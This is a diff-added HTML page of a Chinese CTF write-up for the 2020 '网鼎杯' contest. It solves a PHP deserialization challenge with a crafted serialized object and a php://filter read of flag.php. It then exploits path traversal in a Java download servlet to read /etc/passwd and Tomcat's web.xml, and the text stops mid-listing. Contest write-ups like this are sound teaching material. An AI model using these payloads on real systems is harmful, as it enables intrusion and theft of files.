@@ -1,0 +1,959 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>“网鼎杯”2020 Writeup - Leon&#39;s Blog</title><meta name="Description" content="Leon&#39;s Blog-Keep learning web security"><meta property="og:title" content="“网鼎杯”2020 Writeup" />
+<meta property="og:description" content="“网鼎杯”2020做题笔记" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://clq0.top/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-writeup/" />
+<meta property="og:image" content="https://clq0.top/logo_.jpg"/>
+<meta property="article:published_time" content="2020-05-10T14:23:34+08:00" />
+<meta property="article:modified_time" content="2020-05-10T14:23:34+08:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://clq0.top/logo_.jpg"/>
+
+<meta name="twitter:title" content="“网鼎杯”2020 Writeup"/>
+<meta name="twitter:description" content="“网鼎杯”2020做题笔记"/>
+<meta name="application-name" content="Leon&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Leon&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://clq0.top/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-writeup/" /><link rel="next" href="https://clq0.top/minilctf2020-writeup/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "“网鼎杯”2020 Writeup",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/clq0.top\/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-writeup\/"
+        },"genre": "posts","keywords": "prototype pollution, XXE","wordcount":  2851 ,
+        "url": "https:\/\/clq0.top\/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-writeup\/","datePublished": "2020-05-10T14:23:34+08:00","dateModified": "2020-05-10T14:23:34+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Leon","logo": "https:\/\/clq0.top\/logo_.jpg"},"author": {
+                "@type": "Person",
+                "name": "Leon"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Leon&#39;s Blog"><span class="header-title-pre">❤</span>Leon&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Leon&#39;s Blog"><span class="header-title-pre">❤</span>Leon&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">“网鼎杯”2020 Writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="http://clq0.top" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>Leon</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeup/"><i class="far fa-folder fa-fw"></i>Writeup</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-05-10">2020-05-10</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;2851 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;6 minutes&nbsp;<span id="/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-writeup/" class="leancloud_visitors" data-flag-title="“网鼎杯”2020 Writeup">
+                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
+                    </span>&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#areuserialz">AreUSerialz</a></li>
+    <li><a href="#filejava">filejava</a></li>
+    <li><a href="#notes">notes</a></li>
+    <li><a href="#trace">trace</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>“网鼎杯”2020做题笔记</p>
+<h2 id="areuserialz">AreUSerialz</h2>
+<p>开题即送源码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+
+<span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
+
+<span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+
+<span class="k">class</span> <span class="nc">FileHandler</span> <span class="p">{</span>
+
+    <span class="k">protected</span> <span class="nv">$op</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$filename</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$content</span><span class="p">;</span>
+
+    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nv">$op</span> <span class="o">=</span> <span class="s2">&#34;1&#34;</span><span class="p">;</span>
+        <span class="nv">$filename</span> <span class="o">=</span> <span class="s2">&#34;/tmp/tmpfile&#34;</span><span class="p">;</span>
+        <span class="nv">$content</span> <span class="o">=</span> <span class="s2">&#34;Hello World!&#34;</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">process</span><span class="p">();</span>   
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">process</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">op</span> <span class="o">==</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">write</span><span class="p">();</span>       
+        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">op</span> <span class="o">==</span> <span class="s2">&#34;2&#34;</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$res</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">read</span><span class="p">();</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">output</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">output</span><span class="p">(</span><span class="s2">&#34;Bad Hacker!&#34;</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">private</span> <span class="k">function</span> <span class="nf">write</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">((</span><span class="nx">string</span><span class="p">)</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">output</span><span class="p">(</span><span class="s2">&#34;Too long!&#34;</span><span class="p">);</span>
+                <span class="k">die</span><span class="p">();</span>
+            <span class="p">}</span>
+            <span class="nv">$res</span> <span class="o">=</span> <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
+            <span class="k">if</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">output</span><span class="p">(</span><span class="s2">&#34;Successful!&#34;</span><span class="p">);</span>
+            <span class="k">else</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">output</span><span class="p">(</span><span class="s2">&#34;Failed!&#34;</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">output</span><span class="p">(</span><span class="s2">&#34;Failed!&#34;</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">private</span> <span class="k">function</span> <span class="nf">read</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nv">$res</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">))</span> <span class="p">{</span>
+            <span class="nv">$res</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">return</span> <span class="nv">$res</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">private</span> <span class="k">function</span> <span class="nf">output</span><span class="p">(</span><span class="nv">$s</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&#34;[Result]: &lt;br&gt;&#34;</span><span class="p">;</span>
+        <span class="k">echo</span> <span class="nv">$s</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">op</span> <span class="o">===</span> <span class="s2">&#34;2&#34;</span><span class="p">)</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">op</span> <span class="o">=</span> <span class="s2">&#34;1&#34;</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">process</span><span class="p">();</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">is_valid</span><span class="p">(</span><span class="nv">$s</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$s</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$s</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">&gt;=</span> <span class="mi">32</span> <span class="o">&amp;&amp;</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$s</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">&lt;=</span> <span class="mi">125</span><span class="p">))</span>
+            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">{</span><span class="s1">&#39;str&#39;</span><span class="p">}))</span> <span class="p">{</span>
+
+    <span class="nv">$str</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;str&#39;</span><span class="p">];</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">is_valid</span><span class="p">(</span><span class="nv">$str</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nv">$obj</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>审计代码：</p>
+<p>GET方式传参给str，然后调用is_valid()函数判断传入的参数是否在ASCII码32到125之间，也就是数字、大小写字符以及常规符号，然后进行反序列化</p>
+<p>但是这里会ban掉不可见字符\00，这个在序列化protected属性的对象时会出现，我们需要绕过它，php7.1+版本对属性类型不敏感，所以本地序列化就直接用public就可以绕过了</p>
+<p>然后代码很简单，我们可以序列化构造$op=2和$filename=flag.php，调用read()函数读取flag.php，但是在进行read()之前就会调用__destruct()魔术方法，如果$this-&gt;op === &ldquo;2&quot;就会设置$this-&gt;op为&quot;1&rdquo;，而&quot;1&quot;在process()函数中会调用write()函数，不能读取文件。</p>
+<p>审计代码发现：process()函数中使用了不严格相等if($this-&gt;op == &ldquo;2&rdquo;)</p>
+<p>所以基于PHP的特性我们可以构造$op=”2e0”进行绕过</p>
+<p>然后就是读取文件了，但是直接相对路径读flag.php没用，不知道为什么</p>
+<p>用绝对路径/var/www/html读也没用</p>
+<p>我发现404页面有开发文档：<a href="https://hub.docker.com/r/nimmis/alpine-apache/"><a href="https://hub.docker.com/r/nimmis/alpine-apache/">https://hub.docker.com/r/nimmis/alpine-apache/</a></a></p>
+<p><img class="alignnone size-full wp-image-437" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200510212600.png" alt="" width="515" height="115" /></p>
+<p>然后发现了web路径：</p>
+<p><img class="alignnone size-full wp-image-436" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200510212537.png" alt="" width="633" height="462" /></p>
+<p>所以猜测flag.php路径是：/web/html/flag.php</p>
+<p>直接读取不行，用伪协议读可以</p>
+<p>payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="k">class</span> <span class="nc">FileHandler</span> <span class="p">{</span>
+
+    <span class="k">public</span> <span class="nv">$op</span> <span class="o">=</span> <span class="s2">&#34;2e0&#34;</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$filename</span> <span class="o">=</span> <span class="s2">&#34;php://filter/read=convert.base64-encode/resource=/web/html/flag.php&#34;</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FileHandler</span><span class="p">();</span>
+<span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
+
+<span class="nx">O</span><span class="o">%</span><span class="mi">3</span><span class="nx">A11</span><span class="o">%</span><span class="mi">3</span><span class="nx">A</span><span class="o">%</span><span class="mi">22</span><span class="nx">FileHandler</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nx">A2</span><span class="o">%</span><span class="mi">3</span><span class="nx">A</span><span class="o">%</span><span class="mi">7</span><span class="nx">Bs</span><span class="o">%</span><span class="mi">3</span><span class="nx">A2</span><span class="o">%</span><span class="mi">3</span><span class="nx">A</span><span class="o">%</span><span class="mi">22</span><span class="nx">op</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nx">Bs</span><span class="o">%</span><span class="mi">3</span><span class="nx">A3</span><span class="o">%</span><span class="mi">3</span><span class="nx">A</span><span class="o">%</span><span class="mf">222e0</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nx">Bs</span><span class="o">%</span><span class="mi">3</span><span class="nx">A8</span><span class="o">%</span><span class="mi">3</span><span class="nx">A</span><span class="o">%</span><span class="mi">22</span><span class="nx">filename</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nx">Bs</span><span class="o">%</span><span class="mi">3</span><span class="nx">A67</span><span class="o">%</span><span class="mi">3</span><span class="nx">A</span><span class="o">%</span><span class="mi">22</span><span class="nx">php</span><span class="o">%</span><span class="mi">3</span><span class="nx">A</span><span class="o">%</span><span class="mi">2</span><span class="nx">F</span><span class="o">%</span><span class="mi">2</span><span class="nx">Ffilter</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fread</span><span class="o">%</span><span class="mi">3</span><span class="nx">Dconvert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">encode</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fresource</span><span class="o">%</span><span class="mi">3</span><span class="nx">D</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fweb</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fhtml</span><span class="o">%</span><span class="mi">2</span><span class="nx">Fflag</span><span class="o">.</span><span class="nx">php</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">7</span><span class="nx">D</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>返回：</p>
+<p>Jmx0Oz9waHANCg0KJGZsYWcgPSAiZmxhZ3s4NmFkMmU5My0yNTk2LTRkNDItODcyYS1hMjJlNWViNTI5Zjh9IjsNCg==</p>
+<p>Base64解码得到flag：flag{86ad2e93-2596-4d42-872a-a22e5eb529f8}</p>
+<h2 id="filejava">filejava</h2>
+<p>打开是一个文件上传页面，看了下页面是java写的，题目名称也说了</p>
+<p>上传个文件，然后可以下载，复制下载链接一看：</p>
+<p><a href="http://e4d82ea6f1f8426f99d557844d204d6a81fd39d4ca25413c.cloudgame2.ichunqiu.com:8080/file_in_java/DownloadServlet?filename=46ecab01-0932-480e-9509-9e93672e94c8_a.php"><a href="http://e4d82ea6f1f8426f99d557844d204d6a81fd39d4ca25413c.cloudgame2.ichunqiu.com">http://e4d82ea6f1f8426f99d557844d204d6a81fd39d4ca25413c.cloudgame2.ichunqiu.com</a>:8080/file_in_java/DownloadServlet?filename=46ecab01-0932-480e-9509-9e93672e94c8_a.php</a></p>
+<p>可能存在任意文件下载，尝试：</p>
+<p><a href="http://e4d82ea6f1f8426f99d557844d204d6a81fd39d4ca25413c.cloudgame2.ichunqiu.com:8080/file_in_java/DownloadServlet?filename=../../../../../../../../../etc/passwd"><a href="http://e4d82ea6f1f8426f99d557844d204d6a81fd39d4ca25413c.cloudgame2.ichunqiu.com">http://e4d82ea6f1f8426f99d557844d204d6a81fd39d4ca25413c.cloudgame2.ichunqiu.com</a>:8080/file_in_java/DownloadServlet?filename=../../../../../../../../../etc/passwd</a></p>
+<p>发现可以下载到/etc/passwd</p>
+<p>又根据报错知道是Tomcat于是读取web.xml：</p>
+<p><a href="http://e4d82ea6f1f8426f99d557844d204d6a81fd39d4ca25413c.cloudgame2.ichunqiu.com:8080/file_in_java/DownloadServlet?filename=../../../../../../../../../usr/local/tomcat/webapps/file_in_java/WEB-INF/web.xml"><a href="http://e4d82ea6f1f8426f99d557844d204d6a81fd39d4ca25413c.cloudgame2.ichunqiu.com">http://e4d82ea6f1f8426f99d557844d204d6a81fd39d4ca25413c.cloudgame2.ichunqiu.com</a>:8080/file_in_java/DownloadServlet?filename=../../../../../../../../../usr/local/tomcat/webapps/file_in_java/WEB-INF/web.xml</a></p>
+<p>得到：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<span class="nt">&lt;web-app</span> <span class="na">xmlns:xsi=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;http://java.sun.com/xml/ns/javaee&#34;</span> <span class="na">xsi:schemaLocation=</span><span class="s">&#34;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&#34;</span> <span class="na">id=</span><span class="s">&#34;WebApp_ID&#34;</span> <span class="na">version=</span><span class="s">&#34;2.5&#34;</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;display-name&gt;</span>file_in_java<span class="nt">&lt;/display-name&gt;</span>
+  <span class="nt">&lt;welcome-file-list&gt;</span>
+    <span class="nt">&lt;welcome-file&gt;</span>upload.jsp<span class="nt">&lt;/welcome-file&gt;</span>
+  <span class="nt">&lt;/welcome-file-list&gt;</span>
+  <span class="nt">&lt;servlet&gt;</span>
+    <span class="nt">&lt;description&gt;&lt;/description&gt;</span>
+    <span class="nt">&lt;display-name&gt;</span>UploadServlet<span class="nt">&lt;/display-name&gt;</span>
+    <span class="nt">&lt;servlet-name&gt;</span>UploadServlet<span class="nt">&lt;/servlet-name&gt;</span>
+    <span class="nt">&lt;servlet-class&gt;</span>cn.abc.servlet.UploadServlet<span class="nt">&lt;/servlet-class&gt;</span>
+  <span class="nt">&lt;/servlet&gt;</span>
+  <span class="nt">&lt;servlet-mapping&gt;</span>
+    <span class="nt">&lt;servlet-name&gt;</span>UploadServlet<span class="nt">&lt;/servlet-name&gt;</span>
+    <span class="nt">&lt;url-pattern&gt;</span>/UploadServlet<span class="nt">&lt;/url-pattern&gt;</span>
+  <span class="nt">&lt;/servlet-mapping&gt;</span>
+  <span class="nt">&lt;servlet&gt;</span>
+    <span class="nt">&lt;description&gt;&lt;/description&gt;</span>
+    <span class="nt">&lt;display-name&gt;</span>ListFileServlet<span class="nt">&lt;/display-name&gt;</span>
+    <span class="nt">&lt;servlet-name&gt;</span>ListFileServlet<span class="nt">&lt;/servlet-name&gt;</span>
+    <span class="nt">&lt;servlet-class&gt;</span>cn.abc.servlet.ListFileServlet<span class="nt">&lt;/servlet-class&gt;</span>
+  <span class="nt">&lt;/servlet&gt;</span>
+  <span class="nt">&lt;servlet-mapping&gt;</span>
+    <span class="nt">&lt;servlet-name&gt;</span>ListFileServlet<span class="nt">&lt;/servlet-name&gt;</span>
+    <span class="nt">&lt;url-pattern&gt;</span>/ListFileServlet<span class="nt">&lt;/url-pattern&gt;</span>
+  <span class="nt">&lt;/servlet-mapping&gt;</span>
+  <span class="nt">&lt;servlet&gt;</span>
+    <span class="nt">&lt;description&gt;&lt;/description&gt;</span>
+    <span class="nt">&lt;display-name&gt;</span>DownloadServlet<span class="nt">&lt;/display-name&gt;</span>
+    <span class="nt">&lt;servlet-name&gt;</span>DownloadServlet<span class="nt">&lt;/servlet-name&gt;</span>
+    <span class="nt">&lt;servlet-class&gt;</span>cn.abc.servlet.DownloadServlet<span class="nt">&lt;/servlet-class&gt;</span>
+  <span class="nt">&lt;/servlet&gt;</span>
+  <span class="nt">&lt;servlet-mapping&gt;</span>
